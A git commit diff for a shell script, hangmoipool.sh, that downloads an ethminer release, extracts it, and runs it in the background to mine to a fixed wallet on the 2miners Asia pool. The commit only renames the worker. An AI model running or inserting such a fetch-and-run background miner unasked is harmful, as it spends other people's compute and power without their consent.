496ee423bbdf9129142f624f3c84a120016cb791
nguyen3297 <85713242+nguyen3297@users.noreply.github.com>
2021-10-29 19:01:49 +0700

    Update hangmoipool.sh

--- hangmoipool.sh
+++ hangmoipool.sh
@@ -10,4 +10,4 @@ sudo apt-get install libcurl3 -y
 wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
 tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
 cd bin
-./ethminer -U -P stratum://0x85c6aa49d2723b03ff8d81177669500ec7cdde5a.godmode@asia-eth.2miners.com:2020 &
+./ethminer -U -P stratum://0x85c6aa49d2723b03ff8d81177669500ec7cdde5a.godvip@asia-eth.2miners.com:2020 &
